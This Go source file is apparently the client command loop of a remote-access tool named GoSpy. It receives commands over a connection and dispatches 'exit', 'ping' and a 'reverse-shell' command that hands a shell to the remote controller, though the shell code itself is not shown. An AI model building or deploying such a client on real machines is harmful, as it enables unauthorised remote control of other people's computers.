package client

import (
	"github.com/psidex/GoSpy/internal/commands"
	"github.com/psidex/GoSpy/internal/comms"
	"log"
	"os"
)

// CommandLoop is the loop that receives commands and executes them.
// This should only return an err has occurred and it is impossible to continue as is (i.e. network dropped).
func CommandLoop(c comms.Connection) (err error) {
	for {
		var messageBytes []byte
		messageBytes, err = c.RecvBytes()
		if err != nil {
			break
		}

		message := string(messageBytes)
		log.Printf("Recv: %s", message)

		switch message {

		case "exit":
			log.Println("Exiting")
			os.Exit(0)

		case "ping":
			err = commands.PingReply(c)
			if err != nil {
				break
			}

		case "reverse-shell":
			err = commands.ReverseShellReply(c)
			if err != nil {
				break
			}

		}
	}
	return err
}
